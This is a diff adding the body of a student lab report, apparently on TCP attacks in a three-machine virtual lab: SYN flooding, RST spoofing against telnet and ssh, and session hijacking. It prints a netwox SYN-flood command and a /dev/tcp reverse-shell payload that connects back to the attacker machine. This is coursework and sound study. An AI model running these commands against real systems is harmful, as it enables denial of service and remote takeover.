@@ -22,6 +22,124 @@
 \maketitle
 \newpage
 
+\section*{Note}
+
+This lab utilizes three virtual machines: Attacker, Server, and User (IP addresses listed below). We now describe their functions. Server is a machine with some content that is publicly available over a network (like a website) and User is a machine that accesses Server. The Attacker machine is used to attack the connection between User and Server. Throughout the report, we will use the names Attacker, Server, and User to reference these machines.
+
+\begin{enumerate}
+	\item User: 10.0.2.4
+	\item Server: 10.0.2.5
+	\item Attacker: 10.0.2.6
+\end{enumerate}
+
+\newpage
 \section*{Task 1}
+
+In Task 1, we implement the SYN flooding attack. Note that we assume that SYN cookies are turned off (depicted in Figure \ref{fig:task1.0}). This task utilizes only the Attacker and Server machine. Because the SYN flooding attack attempts to fill the entire queue of requests to Server, this attack is considered to be a Denial of Service attack.
+
+\fig{task1.0}{Turning off SYN cookies}
+
+Figure \ref{fig:task1.1} depicts the state of network connections on Server before Attacker runs the SYN flooding attack. Note how few tcp6 connections there are.
+
+\fig{task1.1}{Network connections before the attack}
+
+\newpage
+Attacker then runs the command ``netwox 76 -i `10.0.2.5' -p `80'\ '' (netwox implements the SYN flooding attack in tool number 76). This fills the queue on the Server machine and leaves no room for anyone other requests to be made. The full queue is shown in Figures \ref{fig:task1.2} and \ref{fig:task1.3}. Note the massive amount of new tcp6 connections all destined for the same port.
+
+\fig{task1.2}{Network connections after the attack (part 1)}
+
+\fig{task1.3}{Network connections after the attack (part 2)}
+
+\newpage
+\section*{Task 2}
+
+Task 2 focuses on implementing the TCP RST attack. This is divided into two parts: telnet connections and ssh connections. The basic idea of the RST attack is to pretend to send a reset packet from one member of a tcp connection to the other member. In other words, we need to spoof a packet.
+
+\subsection*{Part A}
+
+We begin by discussing the TCP RST attack on telnet connections. Figure \ref{fig:task2.A.1} shows User initiating a telnet connection with Server.
+
+\fig{task2.A.1}{Initiating telnet connection}
+
+On Attacker, we then run the tcpdump command to sniff for tcp packets sent on this network. Note that we use the ``--absolute-tcp-sequence-numbers'' flag to avoid seeing relative sequence numbers. The initial output is shown in Figure \ref{fig:task2.A.2}.
+
+\fig{task2.A.2}{Running tcpdump}
+
+Figure \ref{fig:task2.A.3} shows the important output from tcpdump. Here, we see the last tcp packet sent over the wire, which gives us the sequence number that we should use in our spoofed tcp packet. We also gather the important IP and port information in the same figure.
+
+\fig{task2.A.3}{Information needed for spoofing}
+
+\newpage
+With this knowledge, we are prepared to spoof our packet. The python script used to generate the packet is shown in Figure \ref{fig:task2.A.4}. Note that we could have sent the packet to either member of the tcp connection (as long as we had the correct sequence number).
+
+\fig{task2.A.4}{Script to generate RST packet}
+
+When Attacker runs the python script in Figure \ref{fig:task2.A.4}, the telnet connection between User and Server is broken. This is displayed in Figure \ref{fig:task2.A.5}.
+
+\fig{task2.A.5}{Showing broken connection}
+
+\newpage
+\subsection*{Part B}
+
+We now move on to using the RST attack to break a ssh connection. It should be noted that the actual information of a packet in a ssh connection cannot be tampered with (because of encryption), however, ssh uses tcp to transport packets so the RST attack can be used. The process of using the RST attack on ssh vs telnet is almost identical, but we present the following section for clarity. In Figure \ref{fig:task2.B.1}, we show User initiating a ssh connection with Server.
+
+\fig{task2.B.1}{Initiating ssh connection}
+
+On Attacker, we run the tcpdump command (as before) with the telnet attack. Figure \ref{fig:task2.B.2} shows the initial command and Figure \ref{fig:task2.B.3} displays the portion of output that contains the IP addresses, ports, and sequence number required to spoof the RST packet.
+
+\fig{task2.B.2}{Initial tcpdump command}
+
+\fig{task2.B.3}{Information required for spoofing}
+
+\newpage
+We now have the necessary information and can construct a RST packet. Figure \ref{fig:task2.B.4} displays the python script that generates the packet.
+
+\fig{task2.B.4}{Script to generate spoofed packet}
+
+As Figure \ref{fig:task2.B.5} shows, the Attacker can use the above python script to break the ssh connection between User and Server. 
+
+\fig{task2.B.5}{Showing broken connection}
+
+\newpage
+\section*{Task 3}
+
+Task 3 exploits a different aspect of a tcp attack: running commands on a remote machine. This is called TCP Session Hijacking. It should be noted that this attack cannot be used on a ssh connection because the payload would have to be encrypted. The set up for this task is that Server has the file ``/home/seed/secret'' and Attacker would like to read it. For this to occur, User initiates a telnet connection (shown in Figure \ref{fig:task3.1}). 
+
+\fig{task3.1}{Initiating telnet connection}
+
+Simultaneously, Attacker runs the tcpdump command used in previous tasks to gain the necessary information for spoofing a packet (in this case: IP addresses, ports, sequence number, and acknowledgment number). Figure \ref{fig:task3.2} displays the output of tcpdump.
+
+\fig{task3.2}{Information for spoofing}
+
+Figure \ref{fig:task3.3} shows the python used to generate the packet. Take note of two items. First, the value of the sequence number is the most recently seen number plus 10. This means the attack will not occur immediately, but instead after 10 more tcp connections. We do this in case User continues to enter information. Second, note that we now have a payload instead of an RST attack. The payload tells Server to display the contents of the file ``/home/seed/secret'' to a port on Attacker.
+
+\fig{task3.3}{Python script to generate spoofed packet}
+
+\newpage
+Attacker then sends the packet and listens for info on the specified port. Figure \ref{fig:task3.4} shows the message received on that port as ``secret stuff.'' The attack was successful.
+
+\fig{task3.4}{Showing results}
+
+\newpage
+\section*{Task 4}
+
+In Task 4, we instigate a reverse shell using TCP Session Hijacking. The process for this is highly similar to what was used in Task 3. In fact, the only difference is the payload that is sent in the packet. Figure \ref{fig:task4.1} shows User initiating the telnet connection with Server.
+
+\fig{task4.1}{Initiating telnet connection}
+
+Figure \ref{fig:task4.2} displays the output of tcpdump with the required information.
+
+\fig{task4.2}{Output of tcpdump}
+
+We now arrive at the difference between the two attacks. In Figure \ref{fig:task4.3}, the variable Data now contains ``/bin/bash\_shellshock -i $>$ /dev/tcp/10.0.2.6/9090 0$<$\&1 2$>$\&1.'' This command uses the shellshock vulnerability to create a reverse shell that sends and receives its output to port 9090 on the machine 10.0.2.6 (which is Attacker).
+
+\fig{task4.3}{Python script to generate packet} 
+
+\newpage
+On Attacker, we send the packet and listen on port 9090. Figure \ref{fig:task4.4} shows that Attacker is now able to run shell commands on Server.
+
+\fig{task4.4}{Successful reverse shell generated}
+
+Overall, TCP can be exploited in many ways. Encryption (in the form of ssh connections) can certainly reduce vulnerability in that malicious commands cannot be sent over the wire. However, the RST attack can still be used against ssh connections.
 
 \end{document}
